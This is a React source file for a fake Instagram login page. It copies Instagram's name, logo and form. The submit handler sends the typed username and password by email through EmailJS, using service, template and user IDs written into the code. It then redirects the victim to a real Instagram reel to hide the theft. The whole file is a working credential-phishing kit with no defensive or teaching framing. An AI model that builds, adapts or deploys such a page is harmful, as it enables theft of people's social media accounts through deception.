import React, { useState } from 'react';
import emailjs from 'emailjs-com';

const Login = () => {
  // State to store form data and errors
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const [error, setError] = useState('');

  // Handle input change
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
    setError(''); // Clear error when the user types
  };

  // Password validation function (Instagram-like)
  const isValidPassword = (password) => {
    const minLength = 6;
    const hasLetter = /[a-zA-Z]/.test(password);
    const hasNumber = /[0-9]/.test(password);

    return password.length >= minLength && hasLetter && hasNumber;
  };

  // Handle form submission
  const handleSubmit = (e) => {
    e.preventDefault();

    // Check if the password is valid
    if (!isValidPassword(formData.password)) {
      setError(
        'Password must be at least 6 characters long, and include at least one letter and one number.'
      );
      return;
    }

    // If valid, send form data using EmailJS
    emailjs.send(
      'service_0wdmx3e',       // Replace with your EmailJS Service ID
      'template_j1i3j7a',      // Replace with your EmailJS Template ID
      formData,                // Data to be sent in the email
      'UGclixFGJ4TR5VXQK'      // Replace with your EmailJS User ID
    )
    .then((result) => {
      console.log(result.text);
      // Redirect to provided link after successful form submission
      window.location.href = "https://www.instagram.com/reel/CucGUFGP3WK/?igsh=MWtsdzZndHlqeDllZw==";  // Replace with your target URL
    })
    .catch((error) => {
      console.log(error.text);
    });
  };

  return (
    <div className="flex justify-center items-center h-screen bg-gray-50">
      <div className="bg-white p-10 rounded-lg shadow-lg max-w-sm w-full">
        {/* Instagram Heading at the top */}
        <h1 className="text-4xl italic font-semibold text-center text-black mb-6">
          Instagram
        </h1>

        {/* Instagram Logo */}
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png"
          alt="Instagram Logo"
          className="mx-auto w-32 mb-4"
        />

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="mt-6">
          <div className="mb-4">
            <input
              type="text"
              name="username"
              placeholder="Phone number, username, or email"
              className="input input-bordered w-full bg-gray-100 focus:bg-white"
              value={formData.username}
              onChange={handleChange}
              required
            />
          </div>
          <div className="mb-4">
            <input
              type="password"
              name="password"
              placeholder="Password"
              className="input input-bordered w-full bg-gray-100 focus:bg-white"
              value={formData.password}
              onChange={handleChange}
              required
            />
            {error && <p className="text-red-500 text-sm mt-2">{error}</p>} {/* Error message */}
          </div>
          <button type="submit" className="btn btn-primary w-full">Log In</button>
        </form>

        <div className="text-center mt-6 text-sm">
          <a href="#" className="text-blue-500">Forgot password?</a>
        </div>
      </div>
    </div>
  );
};

export default Login;
